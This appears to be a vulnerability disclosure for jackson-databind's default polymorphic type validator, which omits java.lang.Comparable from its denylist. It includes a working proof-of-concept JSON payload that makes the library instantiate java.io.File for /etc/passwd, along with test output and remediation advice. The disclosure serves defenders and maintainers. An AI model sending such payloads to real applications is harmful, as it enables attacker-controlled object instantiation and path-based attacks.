@@ -1,0 +1,81 @@
+Summary
+DefaultBaseTypeLimitingValidator — the PolymorphicTypeValidator used automatically whenever @JsonTypeInfo is applied without an explicitly configured custom validator — denies polymorphic resolution only for nine specific "unsafe base types" (Object, Serializable, Closeable, AutoCloseable, Cloneable, Runnable, java.util.logging.Handler, javax.naming.Referenceable, javax.sql.DataSource). Its isSafeSubType() returns true unconditionally for every other base type. java.lang.Comparable is not in that list, despite being implemented by a very large fraction of JDK and application classes — comparable in breadth to Serializable, which is denylisted for exactly that reason. An application with an @JsonTypeInfo-annotated Comparable-typed property, and no custom validator configured, will accept a type identifier for essentially any class implementing Comparable.
+
+Details
+Affected file: src/main/java/tools/jackson/databind/jsontype/DefaultBaseTypeLimitingValidator.java
+
+private final static class UnsafeBaseTypes {
+    private final Set<String> UNSAFE = new HashSet<>();
+    {
+        UNSAFE.add(Object.class.getName());
+        UNSAFE.add(java.io.Closeable.class.getName());
+        UNSAFE.add(java.io.Serializable.class.getName());
+        UNSAFE.add(AutoCloseable.class.getName());
+        UNSAFE.add(Cloneable.class.getName());
+        UNSAFE.add(Runnable.class.getName());          // [databind#5014]
+        UNSAFE.add("java.util.logging.Handler");
+        UNSAFE.add("javax.naming.Referenceable");
+        UNSAFE.add("javax.sql.DataSource");
+        // java.lang.Comparable is NOT present here
+    }
+}
+
+protected boolean isSafeSubType(DatabindContext ctxt,
+        JavaType baseType, JavaType subType) {
+    return true;   // unconditional for every base type not in UNSAFE
+}
+The class's own JavaDoc acknowledges the design ("Note that when using potentially unsafe base type like java.lang.Object a custom implementation... is needed"), so the trade-off of leaving broad base types unrestricted is intentional. The gap is that Comparable has the same breadth of implementers as the types this class does restrict, and its absence looks like an oversight rather than a deliberate choice — consistent with the ongoing, incremental nature of this list (Runnable was added recently for issue #5014).
+
+This is specific to the default, unconfigured validator reached via bare @JsonTypeInfo usage. Global "Default Typing" via activateDefaultTyping() is not affected, because that method structurally requires an explicit PolymorphicTypeValidator argument — a correctly-configured BasicPolymorphicTypeValidator rejects the same payload under activateDefaultTyping().
+
+PoC
+Built entirely from source (jackson-databind + jackson-core + jackson-annotations, javac, OpenJDK 21, no third-party gadget libraries, no network access):
+
+1. Sanity check (benign class, confirms the mechanism fires):
+
+static class SafeThing implements Comparable<SafeThing> {
+    public String name;
+    public SafeThing() {}
+    public int compareTo(SafeThing o) { return 0; }
+}
+static class Holder {
+    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
+    public Comparable<?> value;
+}
+
+ObjectMapper mapper = JsonMapper.builder().build();   // no custom PTV
+String json = "{\"value\":{\"@class\":\"...SafeThing\",\"name\":\"hello\"}}";
+Holder h = mapper.readValue(json, Holder.class);
+// RESULT: ACCEPTED, class=...SafeThing
+2. Real JDK class substitution:
+
+String json = "{\"value\":[\"java.io.File\",\"/etc/passwd\"]}";
+Holder h = mapper.readValue(json, Holder.class);
+// RESULT: ACCEPTED, class=java.io.File value=/etc/passwd
+3. Negative control — Default Typing with an explicit custom PTV:
+
+PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
+    .allowIfSubType("PtvGapTest4").build();
+ObjectMapper mapper = JsonMapper.builder()
+    .activateDefaultTyping(ptv, DefaultTyping.NON_FINAL).build();
+// same java.io.File payload
+// RESULT: REJECTED - InvalidTypeIdException: "...denied resolution"
+Observed output:
+
+$ java -cp .:build/classes PtvGapTest3
+Trying: {"value":["java.io.File","/etc/passwd"]}
+ACCEPTED, class=java.io.File value=/etc/passwd
+
+$ java -cp .:build/classes PtvGapTest4
+Trying malicious substitution: ["PtvGapTest4$Holder",{"value":["java.io.File","/etc/passwd"]}]
+REJECTED - InvalidTypeIdException: Could not resolve type id 'java.io.File' as a
+subtype of java.lang.Comparable: Configured PolymorphicTypeValidator denied resolution
+
+Impact
+Any application declaring an @JsonTypeInfo-annotated property or class with Comparable as its base type, without a separately configured restrictive PolymorphicTypeValidator, will accept a type identifier for essentially any class implementing Comparable. Concrete impact is demonstrated via java.io.File: an attacker can cause construction of a File object for an arbitrary, attacker-chosen path. On its own this is a controlled-object-instantiation primitive; if the application later calls path-sensitive or mutating methods on the received value, this becomes a path-traversal-adjacent primitive.
+
+Suggested remediation:
+
+Add java.lang.Comparable to UnsafeBaseTypes.UNSAFE.
+Audit other broad JDK interfaces (java.lang.Iterable, java.util.EventListener) for the same gap.
+Consider a narrower default for isSafeSubType() for base types outside the fixed denylist, rather than unconditional true.
